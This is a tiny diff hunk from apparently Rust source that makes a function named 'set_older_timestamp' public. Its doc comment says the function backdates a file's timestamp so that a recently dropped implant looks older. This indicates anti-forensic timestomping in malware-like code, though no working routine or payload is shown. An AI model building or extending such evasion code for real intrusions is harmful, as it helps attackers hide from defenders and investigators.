@@ -1219,7 +1219,7 @@ fn is_elevated() -> bool {
 ///
 /// The creation time of a file that appeared today says more about the
 /// implant than its name does.
-fn set_older_timestamp(path: &Path) -> Result<(), String> {
+pub fn set_older_timestamp(path: &Path) -> Result<(), String> {
     #[cfg(unix)]
     {
         use std::os::unix::fs::PermissionsExt;
